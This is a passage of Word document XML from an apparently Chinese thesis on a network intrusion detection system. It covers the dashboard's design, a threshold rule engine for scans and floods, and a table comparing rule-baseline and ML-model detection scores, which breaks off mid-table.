              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>特征、规则、训练流水线、混合森林的单元测试</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="67CE11AC">
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B72189B">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.5.1 看板的信息架构</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="109BA4C8">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>看板有四个标签页，分别对应四类使用者的问题：现在网络里在发生什么（实时总览）、有哪些告警（告警）、这条告警为什么可疑（诊断报告）、上周三那次扫描是什么情况（历史查询）。四个标签页共用顶部的连接设置与统计时间范围，切换标签不重新输入。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F18DE6">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="120" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5471795" cy="3208020"/>
            <wp:effectExtent l="0" t="0" r="1460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72000" cy="3208482"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="284E5553">
      <w:pPr>
        <w:spacing w:before="0" w:after="200"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>图 3-7　实时总览：四个指标块、每 10 秒的流数量折线、判定分布与协议构成</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B8EDDC3">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>自动刷新是用 Streamlit 的 fragment 实现的：实时总览每 2 秒、告警页每 5 秒、报告页每 10 秒各自局部重渲，而不是整页重跑。这里踩过一个坑——最初在告警页里调用了 st.rerun(scope="app")，那一刻会连实时页一起重跑，整页重跑会把标签页冲回第一个，于是用户每选一次告警就被弹回“实时总览”。改成只写 session_state、由报告页自己按 10 秒刷新之后，标签页才稳得住。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60B62943">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="120" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5471795" cy="1318260"/>
            <wp:effectExtent l="0" t="0" r="14605"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472000" cy="1318554"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4702E0A8">
      <w:pPr>
        <w:spacing w:before="0" w:after="200"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>图 3-8　告警页：类别过滤、告警表（含来源与判定值）、告警类别分布</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D08F2EB">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>告警表里有一列叫“判定值”，它的含义随来源变化：小模型的告警显示为百分比（100.0%），规则的告警显示为超阈值倍数（1.03×）。这两者不是同一种量，所以不在同一列里混着比大小，而是在表下用文字说明“规则不输出置信度”。图表也遵守同一条原则：颜色从不单独承载信息，所有柱状图都直接标数值，风险等级同时写文字。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D263DE0">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="120" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5471795" cy="1713865"/>
            <wp:effectExtent l="0" t="0" r="1460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72000" cy="1714120"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C595F9">
      <w:pPr>
        <w:spacing w:before="0" w:after="200"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>图 3-9　历史查询：按探针、日期、类别过滤，结果可导出 CSV</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7187EED8">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>会话流水表只下发展示用的几个特征列，不下发 78 维整包——200 行整包会超过 1 MB，而看板要的是“看得懂”，不是“看得全”。要核查细节时按流标识回中心取原始记录，再回 pcap 里逐帧对照。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="622BB273">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.5.2 阈值规则引擎</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3606528C">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>规则层不是“小模型的简化版”，它在系统里有两个独立用途：一是与机器学习同口径的确定性对照基线，二是线上兜底。判据分两组：单流规则只看一条流的特征（包长、时长、包数、标志位），阈值取自训练段各类的分位数；现场行为规则判的是窗口内的行为量（同一源在 60 秒内探了多少个不同目的端口、同一目的端口上未应答的 SYN 流有多少条），这类量不依赖采集口径，线上用它。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64FFEFCA">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>两条实现约定需要交代。其一是去重按域而不按规则：一次 200 端口的扫描会同时命中 port_scan、portscan_short、scan_single 三条规则，若每条各报一次，看板就被刷满，“这是一次扫描”反而看不出来。所以扫描类共用一个按源 IP 的去重域，洪泛类按目的 IP:端口，每次只报一条、60 秒冷却。其二是规则不输出置信度：告警表里 source='rule' 的行，confidence 存的是“超出阈值多少倍”，不是概率，看板按“1.03×”这样的措辞展示，不与小模型的 0.996 并列比较。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67249E6C">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>还有一条容易被忽略的约定：flow_rules() 返回的列表顺序就是优先级，pick() 取第一条，不按 strength 排序。原因是不同规则的“超出多少倍”之间没有可比性——超阈值 20 倍的端口扫描与超阈值 2 倍的洪泛，谁更严重取决于场景，不取决于倍数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34782EA6">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.5.3 规则基线评测结果</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14F9960D">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="60"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>表 3-11　阈值规则基线与小模型在同一段测试集上的对照（22 907 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701"/>
        <w:gridCol w:w="1701"/>
        <w:gridCol w:w="1701"/>
        <w:gridCol w:w="1701"/>
      </w:tblGrid>
      <w:tr w14:paraId="47E6A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EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="61D4DF00">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>类别</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="47C83E81">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>规则精确率</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6AADCD6A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>规则召回率</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="55399112">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>规则 F1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EDEDED"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="50E1E257">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>小模型 F1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="2D165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101AEF2B">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>BENIGN</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="6D796C53">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.633</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4DF82331">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.607</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0E6B7962">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.620</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="34284FEA">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.979</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="1C810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BFDD5A8">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DDoS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="74F3917A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.919</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7CFF1886">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.471</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5D3D4705">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.623</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5826605F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.955</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="4618D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814" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="387B54A0">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DoS Hulk</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="43515AF2">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.704</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7F92DED6">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.256</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5BB788E4">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.376</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7E496484">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.954</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="07083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1910B8B1">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Patator</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5E5EE0EC">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.500</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3C01BA67">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.905</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="67B71988">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.644</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="535D0D38">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.998</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="09F62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CE032CD">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>PortScan</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3FFACB85">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.468</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2F5588AD">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.989</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2C929575">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0.635</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1701" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="153ACD43">
